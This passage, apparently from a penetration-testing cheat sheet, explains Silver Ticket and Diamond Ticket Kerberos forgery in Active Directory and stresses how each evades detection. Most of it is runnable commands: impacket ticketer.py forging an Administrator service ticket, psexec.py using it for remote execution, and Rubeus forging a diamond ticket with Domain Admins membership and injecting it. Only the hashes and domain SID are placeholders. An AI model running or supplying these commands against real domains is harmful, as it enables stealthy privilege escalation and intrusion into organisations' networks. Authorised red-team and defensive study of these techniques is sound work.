**Silver Ticket** forges a service ticket using a _service account's_ hash (not krbtgt) — narrower access (one service only) but never touches the DC, so it's stealthier. **Diamond Ticket** takes a _real_ TGT and modifies its PAC in place rather than forging one from scratch, which evades detections that look for "ticket with no matching AS-REQ".

```
# Silver Ticket (needs the target service account's NTLM hash):
ticketer.py -nthash <SERVICE_ACCT_NTLM> -domain-sid S-1-5-21-XXX-XXX-XXX \
    -domain corp.local -spn cifs/target.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local

# Diamond Ticket (Rubeus, needs krbtgt hash + a real TGT to modify):
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
    /groups:512 /krbkey:<KRBTGT_AES256> /domain:corp.local /dc:DC01.corp.local /ptt
```